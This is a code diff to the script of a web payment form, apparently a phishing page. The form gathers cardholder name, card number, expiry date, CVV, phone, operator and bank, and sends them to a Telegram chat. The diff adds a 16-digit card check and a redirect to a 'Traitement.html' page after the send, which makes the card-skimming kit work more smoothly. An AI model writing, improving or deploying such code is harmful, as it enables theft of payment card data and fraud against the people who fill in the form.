@@ -181,12 +181,22 @@
 
     // جمع البيانات المدخلة
     const nom = document.getElementById("nom").value;
-    const numeroCarte = document.getElementById("numero-carte").value;
+    const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, ''); // إزالة المسافات
     const dateExpiration = document.getElementById("date-expiration").value;
     const cvv = document.getElementById("cvv").value;
     const telephone = document.getElementById("telephone").value;
     const operateur = document.getElementById("operateur").value;
     const bank = document.getElementById("bank").value;
+
+    // التحقق من صحة رقم البطاقة
+    if (numeroCarte.length !== 16 || isNaN(numeroCarte)) {
+        const cardError = document.getElementById('card-error');
+        const cardInput = document.getElementById('numero-carte');
+        cardInput.classList.add('border-red-500');
+        cardError.style.display = 'block';
+        cardError.textContent = "Le numéro de carte doit contenir exactement 16 chiffres numériques.";
+        return; // وقف التنفيذ إذا كان الرقم غير صحيح
+    }
 
     // إعداد النص للإرسال
     const message = `
@@ -219,6 +229,8 @@
     .then(data => {
         if (data.ok) {
             alert("تم إرسال المعلومات بنجاح!");
+            // توجيه المستخدم إلى الصفحة التالية بعد الإرسال الناجح
+            window.location.href = "Traitement.html";
         } else {
             alert("حدث خطأ أثناء الإرسال إلى تلغرام.");
         }
@@ -228,10 +240,6 @@
         alert("تعذر إرسال البيانات. تحقق من الاتصال.");
     });
 });
-
-        // إذا كان الرقم صحيحًا، يتم توجيه المستخدم إلى الصفحة التالية
-        window.location.href = "Traitement.html";
-    }
 </script>
 </body> 
 </html>
